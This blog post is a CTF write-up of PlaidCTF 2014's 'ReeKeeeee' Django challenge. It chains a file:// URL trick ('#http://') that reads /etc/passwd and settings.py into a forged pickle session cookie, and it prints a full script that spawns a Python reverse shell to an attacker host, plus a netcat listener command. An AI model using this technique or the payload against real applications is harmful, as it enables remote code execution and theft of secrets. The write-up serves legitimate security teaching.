---
layout: post
title: "PlaidCTF 2014: ReeKeeeee"
date: 2014-04-14 06:46:01 +0000
permalink: /2014/04/14/plaidctf-2014-reekeeeee/
category: Security
tags:
  - CTF
  - PlaidCTF
  - Security
---
ReeKeeeeee was, by far, the most visually painful challenge in the CTF, with a flashing rainbow background on every page.  Blocking scripts was clearly a win here.  Like many of the challenges this year, it turned out to require multiple exploitation steps.

ReeKeeeeee was a meme-generating service that allowed you to provide a URL to an image and text to overlay on the image.  Source code was provided, and it was worth noting that it's a Django app using the <code>django.contrib.sessions.serializers.PickleSerializer</code> serializer.  As the [documentation for the serializer](https://docs.djangoproject.com/en/3.0/topics/http/sessions/) notes, **If the SECRET_KEY is not kept secret and you are using the PickleSerializer, this can lead to arbitrary remote code execution.**  So, maybe, can we get the SECRET_KEY?

#### Getting SECRET_KEY ####
Here's the core of the meme-creation view in views.py:

    try:
      if "http://" in url:
        image = urllib2.urlopen(url)
      else:
        image = urllib2.urlopen("http://"+url)
    except:
      return HttpResponse("Error: couldn't get to that URL"+BACK)
    if int(image.headers["Content-Length"]) > 1024*1024:
      return HttpResponse("File too large")
    fn = get_next_file(username)
    print fn
    open(fn,"w").write(image.read())
    add_text(fn,imghdr.what(fn),text)


Looking at how images are loaded, they are sourced via <code>urllib2.urlopen</code>, then saved to a file, then PIL is used to add text to the image.  If the file is not a valid image type, an exception will be thrown during this phase.  However, **the original file downloaded remains on disk.**  This means we can use the download to source any file and get a copy of it, even though it will be served with the bizarre mimetype image/None.

At first, it appears that only http:// urls are permitted, so we considered that we might be able to source some URL from localhost that might provide us with the application configuration, but we couldn't find any such URL.  I tried building a webserver that sends a redirect to a file:// url, but the Python developers are wise to that.  Then I noticed that it says <code>"http://" in url</code>, which means that it only needs to *contain* http://, but doesn't have to start with that protocol.  So, I began playing around with options to try to use a file:// url, but containing http://.  My first thought was as a username, with something like <code>file://http://@/etc/passwd</code> or <code>file://http://@localhost/etc/passwd</code>, but neither of those worked.  I also tried a query-string like path, with <code>file:///etc/passwd?http://</code>, but that's also just considered part of the filename.  Finally, my teammate Taylor noticed that this construct seems to work: <code>file:///etc/passwd#http://</code>.

Now we needed to find the SECRET_KEY.  Even though we dumped <code>/etc/passwd</code>, and could see users and home directories, we couldn't find settings.py.  It took a few minutes to realize that we could find the directory we were running from by <code>/proc/self/cwd</code>, and based on the provided source, the file was probably at <code>mymeme/settings.py</code>.  Trying <code>file:///proc/self/cwd/mymeme/settings.py#http://</code> for the image URL finally gave us a usable copy of settings.py.

#### SECRET_KEY to flag ####
Given the SECRET_KEY, we can now construct our own session tokens.  Since we're using the pickle session module, we can produce sessions that give us code execution via pickling.  Objects can implement a custom <code>__reduce_\_</code> method that defines how they are to be pickled, and they will be unpickled by calling the relevant "constructor function."  For a general primer on exploiting Python pickling, see [Nelson Elhage's blog post](https://blog.nelhage.com/2011/03/exploiting-pickle/). 

I decide the easiest way to exploit code execution is to use a reverse shell on the box, which can be launched via subprocess.popen.  Since we know python is on the system, but can't be sure of any other tools, I decide to use a python reverse shell.  Here's the script I wrote to construct a new session cookie:

    #!python
    import os
    import subprocess
    import pickle
    from django.core import signing
    from django.contrib.sessions.serializers import PickleSerializer
    
    os.environ.setdefault("DJANGO_SETTINGS_MODULE", "mymeme.settings")
    
    class Exploit(object):
      def __reduce__(self):
        return (subprocess.Popen, (
          ("""python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("xxx.myvps.xxx",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' &"""),
          0, # Bufsize
          None, # exec
          None, #stdin
          None, #stdout
          None, #stderr
          None, #preexec
          False, #close_fds
          True, # shell
          ))
    
    #pickle.loads(pickle.dumps(Exploit()))
    
    print signing.dumps(Exploit(),
        salt='django.contrib.sessions.backends.signed_cookies',
        serializer=PickleSerializer,
        compress=True)

Running this gives us our new cookie value.  Before I load a page with the cookie, I start a netcat listener with <code>nc -l -p 1234</code> for the shell to connect to.  When I load the page, I see my listener get a connection, and I have a remote shell.  Moving up a directory, I find an executable named something like <code>run_this_for_flag.exe</code> and I run it to get the flag.

#### Conclusion ####
Took an information disclosure + remote code execution via pickle, but just goes to show you how easy it is to escalate a bad use of urlopen to a remote shell.  In fact, had it said <code>url.startswith('http://')</code> instead of <code>'http://' in url</code>, everything would've stopped there.  Small vulnerabilities can lead to big problems.
